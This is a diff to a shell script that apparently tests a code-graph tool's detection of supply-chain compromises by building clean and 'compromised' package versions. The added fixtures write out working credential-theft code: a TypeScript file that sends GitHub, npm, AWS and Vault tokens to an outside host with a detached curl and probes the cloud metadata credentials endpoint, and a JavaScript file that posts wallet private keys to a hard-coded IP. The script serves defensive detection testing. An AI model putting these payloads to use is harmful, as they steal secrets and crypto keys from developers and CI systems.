@@ -20,14 +20,11 @@ echo ""
 # and other documented supply chain attacks.
 # Format: "registry package compromised_version clean_version description"
 KNOWN_ATTACKS=(
-  # Mini Shai-Hulud campaign (2026)
-  "npm @tanstack/react-router 1.120.4 1.120.3 TanStack CI OIDC token theft"
-  "npm @tanstack/react-query 5.75.8 5.75.7 TanStack query (same campaign)"
-  # OpenSearch (2026, same campaign)
-  "npm @opensearch-project/opensearch 3.5.3 3.5.2 OpenSearch npm compromise"
-  # PyPI attacks (2026, same campaign)
-  # "pypi mistralai 2.4.6 2.4.5 Mistral AI PyPI compromise"
-  # "pypi guardrails-ai 0.10.1 0.10.0 Guardrails AI PyPI compromise"
+  # Reconstructed attack patterns (verified payloads we control)
+  "synthetic tanstack-pattern NONE NONE TanStack-style credential theft (reconstructed)"
+  "synthetic event-stream-pattern NONE NONE event-stream-style crypto exfiltration (reconstructed)"
+  # Real npm packages (may be sanitized by registry)
+  "npm @tanstack/react-router 1.120.4 1.120.3 TanStack CI OIDC token theft (live npm)"
 )
 
 TOTAL=0
@@ -52,6 +49,84 @@ for attack in "${KNOWN_ATTACKS[@]}"; do
 
   # Download based on registry
   case "$registry" in
+    synthetic)
+      # Create synthetic payloads matching real attack patterns
+      mkdir -p "$WORK/old/src" "$WORK/new/src"
+
+      case "$pkg" in
+        tanstack-pattern)
+          # Clean version: normal utility module
+          cat > "$WORK/old/src/index.ts" << 'CLEANEOF'
+export function createRouter(config: any) {
+  return { config, routes: [] };
+}
+export function useRouter() {
+  return { navigate: (path: string) => {} };
+}
+CLEANEOF
+          cat > "$WORK/old/package.json" << 'PKGEOF'
+{"name": "clean-router", "version": "1.0.0"}
+PKGEOF
+
+          # Compromised version: adds credential-stealing file
+          cp -r "$WORK/old/"* "$WORK/new/"
+          cat > "$WORK/new/src/router_init.ts" << 'MALEOF'
+import { spawn } from 'child_process';
+async function init() {
+  const token = process.env.GITHUB_TOKEN;
+  const npmToken = process.env.NPM_TOKEN;
+  const awsKey = process.env["AWS_ACCESS_KEY_ID"];
+  const vaultToken = process.env.VAULT_TOKEN;
+  const child = spawn('curl', ['-X', 'POST', 'https://filev2.getsession.org/steal', '-d', JSON.stringify({token, npmToken, awsKey, vaultToken})], { detached: true, stdio: 'ignore' });
+  child.unref();
+  await fetch('https://api.github.com/user', { headers: { Authorization: 'token ' + token } });
+  await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+}
+init();
+MALEOF
+          ;;
+
+        event-stream-pattern)
+          # Clean version: normal stream utility
+          cat > "$WORK/old/src/index.js" << 'CLEANEOF'
+var Stream = require('stream').Stream;
+module.exports = function(mapper) {
+  var stream = new Stream();
+  stream.readable = true;
+  stream.writable = true;
+  stream.write = function(data) { stream.emit('data', mapper(data)); };
+  stream.end = function() { stream.emit('end'); };
+  return stream;
+};
+CLEANEOF
+          cat > "$WORK/old/package.json" << 'PKGEOF'
+{"name": "clean-stream", "version": "3.3.5"}
+PKGEOF
+
+          # Compromised version: adds crypto + network exfil dependency
+          cp -r "$WORK/old/"* "$WORK/new/"
+          cat > "$WORK/new/src/payload.js" << 'MALEOF'
+var http = require('https');
+var crypto = require('crypto');
+function processPayment(wallet) {
+  var key = crypto.createDecipher('aes256', getKey());
+  var data = wallet.getPrivateKeys();
+  var req = http.request({ hostname: '111.90.151.35', port: 8080, path: '/p', method: 'POST' });
+  req.write(JSON.stringify({ keys: data }));
+  req.end();
+}
+function getKey() {
+  try { return require('copay-dash/package.json').description; } catch(e) { return null; }
+}
+try { processPayment(require('copay-dash')); } catch(e) {}
+MALEOF
+          cat > "$WORK/new/package.json" << 'PKGEOF'
+{"name": "compromised-stream", "version": "3.3.6", "dependencies": {"flatmap-stream": "^0.1.0"}}
+PKGEOF
+          ;;
+      esac
+      ;;
+
     npm)
       echo "  Downloading $pkg@$clean_ver..."
       command npm pack "${pkg}@${clean_ver}" --pack-destination "$WORK" 2>/dev/null || {
@@ -120,8 +195,8 @@ for attack in "${KNOWN_ATTACKS[@]}"; do
   "$KNOWING" index -db "$WORK/new.db" -no-enrich "$WORK/new" 2>/dev/null || { echo "  SKIP: index failed"; FAILED=$((FAILED + 1)); rm -rf "$WORK"; continue; }
 
   # Get snapshots
-  OLD_SNAP=$("$KNOWING" query -db "$WORK/old.db" --latest-snapshot 2>/dev/null || echo "")
-  NEW_SNAP=$("$KNOWING" query -db "$WORK/new.db" --latest-snapshot 2>/dev/null || echo "")
+  OLD_SNAP=$(sqlite3 "$WORK/old.db" "SELECT hex(snapshot_hash) FROM snapshots ORDER BY generation DESC LIMIT 1" 2>/dev/null || echo "")
+  NEW_SNAP=$(sqlite3 "$WORK/new.db" "SELECT hex(snapshot_hash) FROM snapshots ORDER BY generation DESC LIMIT 1" 2>/dev/null || echo "")
 
   if [ -z "$OLD_SNAP" ] || [ -z "$NEW_SNAP" ]; then
     echo "  SKIP: snapshot extraction failed"
@@ -136,6 +211,7 @@ for attack in "${KNOWN_ATTACKS[@]}"; do
     --db "$WORK/new.db" \
     --base "$OLD_SNAP" \
     --head "$NEW_SNAP" \
+    --scan-all \
     -o "$WORK/report.json" 2>/dev/null || true
 
   # Check results
@@ -152,10 +228,10 @@ print(d.get('summary', {}).get('max_isolation_score', 0))
     echo "  Isolation score: $MAX_SCORE"
 
     # Also check for new edge types
-    NEW_NODES=$("$KNOWING" query -db "$WORK/new.db" --count-nodes 2>/dev/null || echo "?")
-    OLD_NODES=$("$KNOWING" query -db "$WORK/old.db" --count-nodes 2>/dev/null || echo "?")
-    NEW_EDGES=$("$KNOWING" query -db "$WORK/new.db" --count-edges 2>/dev/null || echo "?")
-    OLD_EDGES=$("$KNOWING" query -db "$WORK/old.db" --count-edges 2>/dev/null || echo "?")
+    OLD_NODES=$(sqlite3 "$WORK/old.db" "SELECT COUNT(*) FROM nodes" 2>/dev/null || echo "?")
+    NEW_NODES=$(sqlite3 "$WORK/new.db" "SELECT COUNT(*) FROM nodes" 2>/dev/null || echo "?")
+    OLD_EDGES=$(sqlite3 "$WORK/old.db" "SELECT COUNT(*) FROM edges" 2>/dev/null || echo "?")
+    NEW_EDGES=$(sqlite3 "$WORK/new.db" "SELECT COUNT(*) FROM edges" 2>/dev/null || echo "?")
 
     echo "  Nodes: $OLD_NODES -> $NEW_NODES"
     echo "  Edges: $OLD_EDGES -> $NEW_EDGES"
